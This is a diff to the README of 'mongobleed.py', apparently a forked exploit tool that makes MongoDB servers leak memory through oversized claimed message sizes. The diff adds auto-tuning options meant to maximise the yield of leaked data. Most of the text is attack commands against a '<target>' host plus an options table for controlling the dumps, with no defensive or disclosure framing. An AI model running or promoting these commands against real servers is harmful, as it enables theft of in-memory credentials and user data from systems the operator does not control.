@@ -36,6 +36,9 @@ python3 mongobleed.py --host <target> --dump 10MB
 # Dump with a small window around the target (more reliable)
 python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048
 
+# Auto-tune dump size/window for best yield
+python3 mongobleed.py --host <target> --auto
+
 # Loop until stopped (Ctrl+C)
 python3 mongobleed.py --host <target> --loop
 
@@ -65,7 +68,11 @@ python3 mongobleed.py --host <target> --decode
 | `--loop` | false | Keep looping until stopped |
 | `--decode` | false | Decode URL/unicode/base64 previews |
 | `--dump` | none | Single-probe claimed size like `10MB` or `512KB` |
-| `--dump-window` | 0 | Probe +/- N bytes around dump size |
+| `--dump-window` | 0 | Probe +/- N bytes around dump size (0=auto) |
+| `--auto` | false | Auto-tune dump size/window for best yield |
+| `--auto-min` | 64KB | Min size for auto sweep |
+| `--auto-max` | 10MB | Max size for auto sweep |
+| `--auto-samples` | 8 | Samples per config in auto sweep |
 | `--output` | auto | Output file for leaked data |
 
 ## Example Output
@@ -91,7 +98,8 @@ python3 mongobleed.py --host <target> --decode
 - To request ~20MB buffers, target that size with `--max-offset 20971520` (and `--buffer-extra 0`).
 - To keep a smaller scan range but request larger buffers, use `--buffer-extra` so `doc_len + buffer_extra` equals your target size.
 - Use `--dump` for a single probe at an exact claimed size (e.g., `--dump 10MB`).
-- If a single probe yields no leaks, try `--dump-window 2048` (or larger) to scan around the target.
+- `--dump` uses an automatic window when `--dump-window 0`; override it for tighter or wider scans.
+- `--auto` ignores manual `--dump`/offset ranges and picks a size/window based on quick probes.
 - The effective cap is the server’s `maxMessageSizeBytes`; values above it will be rejected before parsing.
 
 ## Improvements
@@ -105,6 +113,7 @@ Compared to the original release, this fork adds:
 - ASCII-safe previews to avoid mangled console output
 - Optional decoding of URL/unicode/base64 previews (`--decode`)
 - Escaped character cleanup for decoded previews (`\\uXXXX`, `\\xNN`, `\\n`, etc.)
+- Automatic dump size/window tuning (`--auto`)
 - Rich-formatted console logging
 - Additional tunables (`--buffer-bump`, `--timeout`, `--preview-bytes`)
 
